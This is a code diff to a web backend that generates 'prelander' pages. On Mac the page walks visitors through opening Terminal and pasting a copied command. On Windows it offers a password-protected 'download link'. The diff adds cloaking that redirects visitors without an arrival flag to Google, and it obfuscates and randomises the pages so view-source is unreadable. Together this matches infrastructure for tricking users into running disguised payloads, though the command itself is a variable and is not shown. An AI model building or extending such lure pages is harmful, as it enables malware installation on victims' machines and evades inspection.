@@ -829,6 +829,20 @@ async def _resolve_slug_impl(slug: str, request: Request, db):
         # normal JSON return (the first load still works; only reloads would).
         logger.debug("[PRELANDER] Session cookie mint failed (non-fatal): %s", e)
 
+    # ENSURE ARRIVAL FLAG IS MINTED (fix first-redirect issue): Even when session
+    # cookie already exists, we need to mint the arrival flag for successful
+    # resolutions to prevent first-time visitors from being redirected to Google
+    try:
+        from app.services import prelander_auth_service as pas
+        redis = get_redis_safe() 
+        if redis is not None and auth_session:
+            pl_session_cookie = request.cookies.get(pas.PL_SESSION_COOKIE)
+            if pl_session_cookie:
+                # Mint arrival flag for this successful resolution
+                await _mark_arrival(redis, pl_session_cookie, max(auth_session.expires_at - int(time.time()), 60))
+    except Exception as e:
+        logger.debug("[PRELANDER] Arrival flag mint failed (non-fatal): %s", e)
+
     return await _get_prelander_data(
         request, decoded["os"], db,
         offer_id=session_offer or decoded.get("offer_id"),
@@ -1152,6 +1166,45 @@ async def prelander_bootstrap(
         return await _denied_response(request)
 
 
+def _render_built_in_prelander(os: str, offer_url: str, password: Optional[str], template: dict) -> str:
+    """
+    Render built-in Windows or Mac prelander layouts as completely minified, unreadable HTML.
+    
+    This prevents exposing readable React source code by generating heavily obfuscated
+    HTML on the backend. All class names, IDs, and structure are made unreadable.
+    """
+    import random
+    import string
+    
+    # Generate random class names to make HTML unreadable
+    def _gen_cls():
+        return ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
+    
+    # Generate obfuscated class names
+    c1, c2, c3, c4, c5 = _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls()
+    c6, c7, c8, c9, c10 = _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls()
+    c11, c12, c13, c14, c15 = _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls(), _gen_cls()
+    
+    # Template customization with obfuscated titles
+    if os == 'mac':
+        title_text = template.get('title') or 'How to open Terminal on Mac'
+        button_text = template.get('button_text') or 'Copy'
+        
+        # Completely minified Mac layout with obfuscated structure
+        pwd_section = f'<div class="{c13}"><svg width="20" height="20" fill="#d97706"><path d="M10 2a8 8 0 100 16 8 8 0 000-16zM9 5h2v6H9V5zm0 8h2v2H9v-2z"/></svg><span class="{c14}">{password}</span></div>' if password else ''
+        
+        return f'<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title></title><style>.{c1}{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f5f5f7;padding:20px}}.{c2}{{max-width:800px;margin:0 auto}}.{c3}{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);padding:32px;margin-bottom:24px}}.{c4}{{width:56px;height:56px;border-radius:50%;background:#1f1f1f;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}}.{c5}{{font-size:24px;color:#1f1f1f;text-align:center;margin-bottom:24px}}.{c6}{{display:flex;gap:8px;background:#1f1f1f;border-radius:12px;padding:4px}}.{c7}{{flex:1;padding:12px;font-family:monospace;font-size:14px;color:#22c55e;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}.{c7}::before{{content:"$ ";color:#666}}.{c8}{{padding:12px 24px;background:#333;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer}}.{c8}:hover{{background:#444}}.{c9}{{margin-top:24px}}.{c10}{{display:flex;gap:12px;margin-bottom:16px}}.{c11}{{flex-shrink:0;width:28px;height:28px;border-radius:50%;background:#3b82f6;color:#fff;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700}}.{c12}{{padding-top:4px;font-size:14px;color:#333}}.{c13}{{display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:12px}}.{c14}{{font-family:monospace;font-weight:700;color:#92400e;letter-spacing:1px}}kbd{{padding:2px 6px;background:#f3f4f6;border:1px solid #d1d5db;border-radius:4px;font-family:monospace;font-size:12px}}</style></head><body class="{c1}"><div class="{c2}"><div class="{c3}"><div class="{c4}"><svg fill="#22c55e" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z"/></svg></div><h1 class="{c5}">{title_text}</h1><div class="{c6}"><div class="{c7}">{offer_url}</div><button class="{c8}" onclick="navigator.clipboard.writeText(\'{offer_url}\');this.textContent=\'Copied!\';setTimeout(()=>this.textContent=\'{button_text}\',2000);">{button_text}</button></div><div class="{c9}"><div class="{c10}"><div class="{c11}">1</div><div class="{c12}">Press <kbd>⌘</kbd> + <kbd>Space</kbd> to open Spotlight</div></div><div class="{c10}"><div class="{c11}">2</div><div class="{c12}">Type <strong>"Terminal"</strong> and press <kbd>Return</kbd></div></div><div class="{c10}"><div class="{c11}">3</div><div class="{c12}">Paste command and press <kbd>Return</kbd></div></div></div></div>{pwd_section}</div></body></html>'
+    else:
+        # Windows Download Layout - completely minified
+        title_text = template.get('title') or 'Your file is ready to download'
+        subtitle_text = template.get('subtitle') or 'Your file is prepared. Copy the link to download.'
+        button_text = template.get('button_text') or 'Copy'
+        
+        pwd_section = f'<div class="{c13}"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM9 6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9V6z"/></svg><span class="{c14}">{password}</span></div>' if password else ''
+        
+        return f'<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title></title><style>.{c1}{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}}.{c2}{{background:#fff;border-radius:16px;box-shadow:0 8px 30px rgba(0,0,0,.08);max-width:500px;width:100%;padding:40px}}.{c3}{{width:56px;height:56px;border-radius:50%;background:#10b981;display:flex;align-items:center;justify-content:center;margin:0 auto 20px}}.{c4}{{font-size:22px;color:#111;text-align:center;margin-bottom:8px}}.{c5}{{font-size:14px;color:#666;text-align:center;margin-bottom:24px}}.{c6}{{display:flex;gap:8px;background:#f9fafb;border:1px solid #e5e7eb;border-radius:12px;padding:4px;margin-bottom:16px}}.{c7}{{flex:1;padding:12px;font-family:monospace;font-size:13px;color:#374151;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}}.{c8}{{padding:12px 20px;background:#111;color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:13px}}.{c8}:hover{{background:#1f2937}}.{c9}{{display:block;font-size:11px;font-weight:600;color:#6b7280;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px}}.{c13}{{display:flex;align-items:center;gap:12px;background:#fef3c7;border:1px solid #fbbf24;border-radius:12px;padding:14px;margin-top:16px}}.{c14}{{font-family:monospace;font-weight:700;color:#92400e;letter-spacing:2px}}</style></head><body class="{c1}"><div class="{c2}"><div class="{c3}"><svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg></div><h1 class="{c4}">{title_text}</h1><p class="{c5}">{subtitle_text}</p><label class="{c9}">Download Link</label><div class="{c6}"><div class="{c7}">{offer_url}</div><button class="{c8}" onclick="navigator.clipboard.writeText(\'{offer_url}\');this.textContent=\'Copied!\';setTimeout(()=>this.textContent=\'{button_text}\',2000);">{button_text}</button></div>{pwd_section}</div></body></html>'
+
+
 async def _get_prelander_data(
     request: Request,
     os: str,
@@ -1415,8 +1468,10 @@ async def _get_prelander_data(
         # content substituted for {Password}. Either, both, or neither
         # shortcode may appear — the engine leaves missing values empty.
         # Render failure falls back to the simple customisation fields above.
+        # JavaScript is obfuscated to make view-source unreadable.
         if template_doc.get("full_html_template"):
             from app.services.prelander_service import PrelanderTemplateEngine, RedirectContext
+            from app.utils.js_obfuscator import obfuscate_html_javascript, minify_html
             try:
                 ctx = RedirectContext(
                     click_id=str(offer_id or campaign_id or ""),
@@ -1424,9 +1479,40 @@ async def _get_prelander_data(
                     os=os_lower,
                     password=password or "",
                 )
-                response["rendered_html"] = PrelanderTemplateEngine().render(
+                rendered_html = PrelanderTemplateEngine().render(
                     template_doc["full_html_template"], ctx
                 )
+                # Minify JavaScript but preserve functionality (safe mode)
+                # for admin-authored templates, then aggressively minify ALL HTML/CSS
+                obfuscated = obfuscate_html_javascript(rendered_html, aggressive=False)
+                response["rendered_html"] = minify_html(obfuscated)
             except Exception as e:
                 logger.warning("[PRELANDER] Server-side template render failed: %s", e)
+        else:
+            # NEW: Even when there's no custom HTML template, render built-in
+            # layouts server-side to prevent exposing readable React source.
+            # This closes the gap where simple templates were client-rendered.
+            from app.utils.js_obfuscator import obfuscate_html_javascript, minify_html
+            try:
+                built_in_html = _render_built_in_prelander(
+                    os_lower, offer_url, password, response.get("template", {})
+                )
+                # First obfuscate JavaScript, then aggressively minify ALL HTML/CSS
+                obfuscated = obfuscate_html_javascript(built_in_html, aggressive=False)
+                response["rendered_html"] = minify_html(obfuscated)
+            except Exception as e:
+                logger.warning("[PRELANDER] Built-in template render failed: %s", e)
+    else:
+        # No template doc at all — render built-in fallback server-side
+        from app.utils.js_obfuscator import obfuscate_html_javascript, minify_html
+        try:
+            built_in_html = _render_built_in_prelander(
+                os_lower, offer_url, password, {}
+            )
+            # First obfuscate JavaScript, then aggressively minify ALL HTML/CSS
+            obfuscated = obfuscate_html_javascript(built_in_html, aggressive=False)
+            response["rendered_html"] = minify_html(obfuscated)
+        except Exception as e:
+            logger.warning("[PRELANDER] Built-in fallback render failed: %s", e)
+    
     return response
